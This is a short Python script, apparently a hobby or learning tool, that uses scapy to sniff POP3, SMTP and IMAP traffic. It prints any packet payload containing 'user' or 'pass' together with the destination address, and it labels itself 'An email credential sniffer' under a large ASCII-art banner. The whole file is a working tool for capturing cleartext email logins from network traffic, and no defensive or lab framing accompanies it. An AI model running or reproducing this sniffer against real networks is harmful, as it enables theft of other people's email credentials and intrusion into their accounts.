from rich.console import Console
from scapy.all import IP, sniff, TCP

def initialize():
    global console
    console = Console()
    show_banner()
    console.print("\n\tAn email credential sniffer", style="bold red")
    ports = "tcp port 110 or tcp port 25 or tcp port 143"
    console.print(f"\n\tWaiting for an information from: \n   [bold green]{ports}[/bold green]")
    sniff(filter=ports, prn=packet_callback, store=0)

def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            console.print(f"[bold blue][+][/bold blue] Destination: {packet[IP].dst}")
            console.print(f"[bold blue][+][/bold blue] {str(packet[TCP].payload)}")

def show_banner():
    banner = """  
                                                )  (  (    (
                                        (  )  () @@  )  (( (
                                    (      (  )( @@  (  )) ) (
                                (    (  ( ()( /---\   (()( (
    _______                            )  ) )(@ !O O! )@@  ( ) ) )
    <   ____)                      ) (  ( )( ()@ \ o / (@@@@@ ( ()( )
/--|  |(  o|                     (  )  ) ((@@(@@ !o! @@@@(@@@@@)() (
|   >   \___|                      ) ( @)@@)@ /---\-/---\ )@@@@@()( )
|  /---------+                    (@@@@)@@@( // /-----\ \\ @@@)@@@@@(  .
| |    \ =========______/|@@@@@@@@@@@@@(@@@ // @ /---\ @ \\ @(@@@(@@@ .  .
|  \   \\=========------\|@@@@@@@@@@@@@@@@@ O @@@ /-\ @@@ O @@(@@)@@ @   .
|   \   \----+--\-)))           @@@@@@@@@@ !! @@@@ % @@@@ !! @@)@@@ .. .
|   |\______|_)))/             .    @@@@@@ !! @@ /---\ @@ !! @@(@@@ @ . .
\__==========           *        .    @@ /MM  /\O   O/\  MM\ @@@@@@@. .
    |   |-\   \          (       .      @ !!!  !! \-/ !!  !!! @@@@@ .
    |   |  \   \          )      . .   .  @@@@ !!     !!  .(. @.  .. .
    |   |   \   \        (    /   .(  . \)). ( |O  )( O! @@@@ . )      .
    |   |   /   /         ) (      )).  ((  .) !! ((( !! @@ (. ((. .   .
    |   |  /   /   ()  ))   ))   .( ( ( ) ). ( !!  )( !! ) ((   ))  ..
    |   |_<   /   ( ) ( (  ) )   (( )  )).) ((/ |  (  | \(  )) ((. ).
____<_____\\__\__(___)_))_((_(____))__(_(___.oooO_____Oooo.(_(_)_)((_

         """
    console.log(banner, style="bold green")